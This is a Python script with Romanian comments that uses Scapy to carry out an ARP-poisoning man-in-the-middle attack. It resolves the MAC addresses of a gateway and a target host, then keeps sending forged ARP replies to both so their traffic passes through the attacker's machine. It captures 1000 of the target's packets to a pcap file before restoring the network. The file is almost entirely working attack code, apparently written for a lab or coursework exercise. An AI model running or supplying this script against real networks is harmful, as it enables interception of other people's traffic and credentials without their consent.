from scapy.all import ARP, send, sr, wrpcap, sniff
import sys
import threading
import time

# Parametrii pentru ARP Poison
gateway_ip = "198.10.0.1"
target_ip = "198.10.0.2"
packet_count = 1000

# Functie care primeste un IP, si trimite face broadcast unui pachet de tip ARP pentru
# a aflat adresa MAC a adresei respective. Returneaza adresa MAC respectiva, sau None
# daca ia timeout request-ul
def get_mac(ip_address):
    # Construim pachetul ARP, cu codul de operatie 1 (who-has)
    # si folosim functia sr (Send and Receive) pentru a trimite request-ul si a astepta raspunsul
    response, _ = sr(ARP(op=1, pdst=ip_address), retry=2, timeout=10)
    for _, packet in response:
        return packet[ARP].hwsrc
    return None

# Restabilim reteaua prin faptul ca facem broadcast cu pachete cu opcode = 2 (is-at)
# cu adresele MAC reale pentru gateway si target (server in cazul nostru)
def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    send(ARP(op = 2, pdst = gateway_ip, hwsrc = target_mac, psrc = target_ip), count = 5)
    send(ARP(op = 2, pdst = target_ip, hwsrc = gateway_mac, psrc = gateway_ip), count = 5)

# Un loop infinit care face broadcast unui pachet care sa amageasca target-ul in legatura cu adresa MAC
# a router-ului, si a unui pachet care sa amageasca gateway-ul in legatura cu adresa MAC a target-ului
def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] Am pornit atacul de tip ARP poison [CTRL-C pentru a opri]")
    try:
        while True:
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
            time.sleep(2)
    except KeyboardInterrupt:
        print("[*] Oprim atacul de ARP Poison. Restabilim reteaua...")
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)


if __name__ == "__main__":
    print("[*] Porneste script-ul...")

    print(f"[*] Gateway IP address: {gateway_ip}")
    print(f"[*] Target IP address: {target_ip}")

    gateway_mac = get_mac(gateway_ip)
    if gateway_mac is None:
        print("[!] Nu putem afla adresa MAC a gateway. Inchidem...")
        sys.exit(0)
    else:
        print(f"[*] Gateway MAC address: {gateway_mac}")

    target_mac = get_mac(target_ip)
    if target_mac is None:
        print("[!] Nu putem afla adresa MAC a target. Inchidem...")
        sys.exit(0)
    else:
        print(f"[*] Target MAC address: {target_mac}")

    # Pornim un thread separat care sa se ocupe de interpunerea intre target si gateway
    poison_thread = threading.Thread(target=arp_poison, args=(gateway_ip, gateway_mac, target_ip, target_mac))
    poison_thread.start()

    # Captam pachetele ce trec prin placa noastra de retea, si le scriem intr-un fisier.
    try:
        sniff_filter = "ip host " + target_ip
        print(f"[*] Pornim captarea pachetelor pe placa de retea. Packet Count: {packet_count}. Filter: {sniff_filter}")
        packets = sniff(filter = sniff_filter, count=packet_count)
        wrpcap(target_ip + "_capture.pcap", packets)
        print(f"[*] Oprim captarea pachetelor. Restabilim reteaua...")
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
    except KeyboardInterrupt:
        print(f"[*] Oprim captarea pachetelor. Restabilim reteaua...")
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
        sys.exit(0)